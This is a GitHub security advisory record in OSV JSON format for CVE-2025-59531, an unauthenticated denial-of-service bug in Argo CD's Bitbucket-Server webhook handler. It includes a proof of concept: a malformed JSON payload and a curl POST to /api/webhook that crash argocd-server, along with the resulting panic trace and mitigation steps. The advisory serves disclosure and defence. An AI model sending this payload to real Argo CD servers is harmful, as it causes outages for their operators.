{
  "schema_version": "1.4.0",
  "id": "GHSA-f9gq-prrc-hrhc",
  "modified": "2025-10-01T21:37:13Z",
  "published": "2025-09-30T18:11:59Z",
  "aliases": [
    "CVE-2025-59531"
  ],
  "summary": "Unauthenticated argocd-server panic via a malicious Bitbucket-Server webhook payload",
  "details": "### Summary\n\nUnpatched Argo CD versions are vulnerable to malicious API requests which can crash the API server and cause denial of service to legitimate clients. \n\nWith the default configuration, no `webhook.bitbucketserver.secret` set, Argo CDâ€™s /api/webhook endpoint will crash the entire argocd-server process when it receives a Bitbucket-Server push event whose JSON field `repository.links.clone` is anything other than an array.\n\nA single unauthenticated curl request can push the control-plane into CrashLoopBackOff; repeating the request on each replica causes a complete outage of the API.\n\n### Details\n```go\n// webhook.go (Bitbucket-Server branch in affectedRevisionInfo)\n\nfor _, l := range payload.Repository.Links[\"clone\"].([]any) {   // <- unsafe cast\n    link := l.(map[string]any)\n    ...\n}\n```\n\nIf links.clone is a string, number, object, or null, the first type assertion panics:\ninterface conversion: interface {} is string, not []interface {}\n\nThe worker goroutine created by startWorkerPool lacks a recover, so the panic terminates the whole binary.\n\n### PoC\n\nSave as payload-panic.json - note the non-array links.clone.\n\n```json\n{\n  \"eventKey\": \"repo:refs_changed\",\n  \"repository\": {\n    \"name\": \"guestbook\",\n    \"fullName\": \"APP/guestbook\",\n    \"links\": { \"clone\": \"boom\" }\n  },\n  \"changes\": [ { \"ref\": { \"id\": \"refs/heads/master\" } } ]\n}\n```\n\n```shell\ncurl -k -X POST https://argocd.example.com/api/webhook \\\n     -H 'X-Event-Key: repo:refs_changed' \\\n     -H 'Content-Type: application/json' \\\n     --data-binary @payload-panic.json\n```\n\nObserved crash (argocd-server restart):\n\n```\npanic: interface conversion: interface {} is string, not []interface {}\ngoroutine 192 [running]:\ngithub.com/argoproj/argo-cd/v3/server/webhook.affectedRevisionInfo\n    webhook.go:209 +0x1218\n...\n```\n\n### Mitigation\n\nIf you use Bitbucket Server and need to handle webhook events, configure a webhook secret to ensure only trusted parties can invoke the webhook handler.\n\nIf you do not use Bitbucket Server, you can set the webhook secret to a long, random value to effectively disable webhook handling for Bitbucket Server payloads.\n\n```diff\napiVersion: v1\nkind: Secret\nmetadata:\n  name: argocd-secret\ntype: Opaque\ndata:\n+  webhook.bitbucketserver.secret: <your base64-encoded secret here>\n```\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n\n### Credits\n\nDiscovered by Jakub Ciolek at AlphaSense.",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/argoproj/argo-cd"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "1.2.0"
            },
            {
              "last_affected": "1.8.7"
            }
          ]
        }
      ]
    },
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/argoproj/argo-cd/v2"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.0.0-rc1"
            },
            {
              "fixed": "2.14.20"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "<= 2.14.19"
      }
    },
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/argoproj/argo-cd/v3"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "3.2.0-rc1"
            },
            {
              "fixed": "3.2.0-rc2"
            }
          ]
        }
      ],
      "versions": [
        "3.2.0-rc1"
      ]
    },
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/argoproj/argo-cd/v3"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "3.1.0-rc1"
            },
            {
              "fixed": "3.1.8"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "<= 3.1.7"
      }
    },
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/argoproj/argo-cd/v3"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "3.0.0-rc1"
            },
            {
              "fixed": "3.0.19"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "<= 3.0.18"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-f9gq-prrc-hrhc"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59531"
    },
    {
      "type": "WEB",
      "url": "https://github.com/argoproj/argo-cd/commit/5c466a4e39802e059e75c0008ae7b7b8e842538f"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/argoproj/argo-cd"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-703"
    ],
    "severity": "HIGH",
    "github_reviewed": true,
    "github_reviewed_at": "2025-09-30T18:11:59Z",
    "nvd_published_at": "2025-10-01T21:16:43Z"
  }
}